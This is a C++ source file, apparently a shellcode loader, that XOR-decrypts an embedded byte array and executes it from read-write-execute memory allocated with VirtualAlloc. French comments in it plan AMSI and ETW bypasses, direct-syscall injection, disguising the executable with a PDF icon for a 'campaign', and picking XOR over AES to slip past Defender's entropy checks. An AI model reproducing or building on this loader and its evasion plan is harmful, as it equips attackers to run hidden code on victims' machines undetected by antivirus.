#include "Windows.h"
#include <iostream>


void xor_decrypt(unsigned char* data, std::size_t size, const std::string& key) {
    std::size_t key_size = key.size();
    for (std::size_t i = 0; i < size; i++) {
        data[i] ^= key[i % key_size];
    }
}

unsigned char calculator[] = "\x29\x53\xaa\x2c\xe4\x8f\xba\x97\x96\x95\x23\xe1\x68\x81\x90\x8f\x8e\x3a\xc8\x0\x81\x78\xd3\x42\xd5\x45\x43\xa\x72\x1c\x62\xe\x6a\xb0\xb6\xb5\xb4\xae\xb9\xc6\xf3\xdd\x11\x98\x17\xab\x57\x22\xa3\x17\xac\x21\xcc\x5c\x61\x11\x88\xa\x40\x68\xdc\x8d\x71\x54\x9f\xa1\xd3\x7c\xc2\x9e\x78\x7d\xe3\xae\xaa\x17\x9f\xa\x8a\x0\x82\x6f\xbb\xdc\xdf\x29\x99\x85\x94\x52\xf5\x58\xfe\x3f\x22\xd7\x5e\x67\x80\x5d\xa\xb5\x86\x4c\xde\x33\x81\xdf\x91\x6f\xf8\x44\xbb\x32\xd0\x9c\x50\xc7\xf3\xe\xb5\x4c\xaf\xfb\x29\xd\x22\x74\xbc\x94\xbf\xfd\xa9\x69\x9\xaf\xe5\x7c\xbe\x6f\x29\x8a\x3\x64\x52\x9d\xd5\x80\xaa\x84\x7e\x40\x14\x74\xad\xca\xc5\x4e\xe1\xfc\x90\x91\x4b\x1d\xc5\x17\x9c\x67\x68\x6\x2e\x4c\x90\x4d\x1a\x50\x9f\x18\x4e\x68\x2f\x3a\x1a\xc2\x99\x4a\x93\x1b\x1d\x3b\x20\x9b\x9d\x20\x87\xd9\x85\x49\x20\x19\x49\x21\x40\x4e\x55\x5\x70\xd0\xc0\x20\x92\x1a\x8b\x1c\x19\x77\xef\xb\xb8\x3d\xb1\x3f\xc8\xd2\x9f\x3\xbb\x8b\x3\x37\x12\x7f\xfd\x12\x7a\x7e\x12\x30\xa4\xd1\x3b\x62\xde\xb3\x99\xa\x34\x43\xcc\x37\x85\x7a\xc7\x96\xaa\x2b\xd3\x24\x8c\x52\x49\x25\xf5\x66\x8\xcb\x4e\xbf\x60\xa6\x8e\xd\x8e\x93\x59\xf2\x4d\x9f\xd0\xc1\xc2\xad\x1\x70\xf3\x5d\x1b\x18\x13\x9d\x2d\x25\xc2\xe8\x28\x9\xe9\x11\xbf\x48\x86\xa\xfe\xd8\x7c\xa3\xbe\x21\x81\x1e\x6f\x55\xc9\x2d\xe3\x72\xe5\x75\x49";

int main()
{
    std::size_t calculator_size = sizeof(calculator) - 1;  // -1 pour ignorer le caractère de fin de chaîne
    std::string key = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+|}{:?><,./;'[]\\=-`~ ";


    void* test = VirtualAlloc(0, calculator_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    xor_decrypt(calculator, calculator_size, key);
    memcpy(test, calculator, calculator_size);
    ((void(*)())test)();

    return 0;
}




//direct syscall documentation injection de shellcode
//bypass la partie dynamique, amsi etw
//télécharger ressource hacker, comment copier un icone de pdf et le mettre sur l'executable.
//faire la démo complète, campagne 




//créer une fonction qui bypass amsi
//bypass etw par une fonction aussi
//utilisation des APIS niveau kernel 
//chiffré avec XOR ou AES : avec XOR parce que AES génère une forte entropy et defender detecte ce type d'algorithme avec un forte entropy et

